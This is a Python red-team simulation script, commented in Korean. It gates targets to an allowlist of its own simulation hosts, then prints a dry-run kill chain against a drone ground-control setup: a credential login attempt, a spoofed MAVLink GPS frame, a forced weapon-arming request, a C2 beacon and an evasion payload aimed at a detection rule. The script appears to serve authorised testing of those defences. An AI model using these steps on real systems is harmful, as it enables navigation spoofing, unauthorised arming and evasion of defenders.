#!/usr/bin/env python3
"""워게임 — 표적 IP/도메인 제공 시 공격 시나리오 (dry-run 계획).

    python benchmarks/wargame.py [target]
    WARGAME_TARGET=sim.pollak.store python benchmarks/wargame.py

인가 스코프 검사 → 정찰(공격면 매핑) → 킬체인(표적 주소 페이로드). 실 외부 전송 없음
(dry-run; 페이로드를 표적 주소로 구성·표시만). 기본 표적=자체 sim(sim.pollak.store).
"""
from __future__ import annotations

import json
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from redteam_core.payloads import AdaptivePayloadGenerator, SituationContext   # noqa: E402
from redteam_core.transport import build_mavlink_gps_frame                     # noqa: E402
from redteam_core.assessment import assess_action                             # noqa: E402

# 인가 교전 스코프(자체 sim). 동언님 gate egress allowlist 와 동형.
IN_SCOPE = {"sim.pollak.store", "20.249.193.191", "20.194.99.116", "127.0.0.1", "localhost"}

# 표적 공격면 프로파일(정찰 결과 모델). 서비스 → (포트, 시나리오, 액션).
SURFACE = {
    "sim.pollak.store": [
        ("HTTPS/noVNC QGC", 443, "S6 GCS 자격증명", "active_scan"),
        ("MAVLink(datalink-los)", 14550, "S1/S30 GNSS 스푸핑·재밍", "gnss_spoof"),
        ("FastAPI 무기 스텁", 8400, "S11 비인가 무장", "force_arm"),
        ("C2 상용포트", 8080, "T0885 은닉 C2", "c2_common_port"),
    ],
}


def _scope_gate(target: str) -> bool:
    return target in IN_SCOPE


def _endpoint_payload(target, svc, port, action):
    """표적 주소로 구성된 페이로드(dry-run 표시)."""
    if action == "active_scan":
        body = {"username": "operator-01", "password": "Spring2026!"}
        return f"POST https://{target}:{port}/login", json.dumps(body, ensure_ascii=False)
    if action == "gnss_spoof":
        frame = build_mavlink_gps_frame(lat_e7=367150000)
        return f"udpout:{target}:{port} (GPS_INPUT)", f"{len(frame)}B {frame[:24].hex()}…"
    if action == "force_arm":
        return f"POST http://{target}:{port}/arm", json.dumps({"action": "ARM", "armed_by": "operator-01"})
    if action == "c2_common_port":
        return f"TCP {target}:{port} beacon", json.dumps({"agent": "beacon-A", "status": "alive"})
    return f"{target}:{port}", "-"


def main():
    target = (sys.argv[1] if len(sys.argv) > 1 else os.environ.get("WARGAME_TARGET", "sim.pollak.store"))
    print("="*68)
    print(f" 워게임: 표적 = {target}")
    print("="*68)

    # 1. 교전 스코프/RoE 게이트
    if not _scope_gate(target):
        print(f"\n⛔ [RoE/스코프] {target} 는 인가 교전 스코프 밖 → 교전 BLOCKED.")
        print(f"   인가 스코프: {', '.join(sorted(IN_SCOPE))}")
        print("   (동언님 gate egress allowlist — 범위 밖 표적 fail-closed)")
        return
    print(f"\n✅ [RoE/스코프] {target} 인가 확인 — 교전 진행(dry-run, 실 전송 없음)")

    # 2. 정찰 — 공격면 매핑
    surface = SURFACE.get(target, SURFACE["sim.pollak.store"])
    print(f"\n── 정찰: 공격면 {len(surface)}개 식별 ──")
    for svc, port, scen, _ in surface:
        print(f"  :{port:<6} {svc:<24} → {scen}")

    # 3. 킬체인 — 표적 주소 페이로드 + 탐지
    print("\n── 킬체인 실행(dry-run): 표적 주소 페이로드 ──")
    for svc, port, scen, action in surface:
        ep, payload = _endpoint_payload(target, svc, port, action)
        det = assess_action(action if action != "c2_common_port" else "active_scan").detected \
            if action in ("active_scan", "gnss_spoof", "force_arm") else None
        mark = {True: "🔴 탐지", False: "🟢 회피", None: "⚪ 사각"}[det]
        print(f"\n  [{scen}] {mark}")
        print(f"    → {ep}")
        print(f"    payload: {payload}")

    # 4. 방어회피 페이로드(SOC 인젝션) — 표적의 blue 룰 겨냥
    inj = AdaptivePayloadGenerator().generate(
        SituationContext(scenario="S32", target_rule="S1_GNSS_Spoofing"))[0]
    print(f"\n  [방어회피: SOC 인젝션] ⚪ 사각")
    print(f"    payload: {inj.text}")

    print(f"\n{'='*68}")
    print(" 요약: 스코프 인가 → 정찰 → 서비스별 시나리오 → 표적 주소 페이로드 구성.")
    print(" 실 전송은 --live + 인가 하에만. 여기선 dry-run 계획.")
    print("="*68)


if __name__ == "__main__":
    main()
